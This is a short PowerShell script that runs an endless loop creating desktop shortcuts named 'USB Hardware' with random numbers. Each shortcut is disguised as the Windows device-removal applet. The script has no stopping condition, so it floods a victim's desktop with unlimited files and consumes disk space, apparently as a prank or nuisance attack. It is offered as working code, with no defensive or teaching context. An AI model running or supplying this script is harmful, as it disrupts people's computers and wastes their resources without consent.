while(1) 
{
    $num = Get-Random
    $AppLocation = "C:\Windows\System32\rundll32.exe"
    $WshShell = New-Object -ComObject WScript.Shell
    
    #add num in the middle of the shortcut here
    $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
    $Shortcut.TargetPath = $AppLocation
    $Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
    $Shortcut.IconLocation = "hotplug.dll,0"
    $Shortcut.Description ="Device Removal"
    $Shortcut.WorkingDirectory ="C:\Windows\System32"
    $Shortcut.Save()
}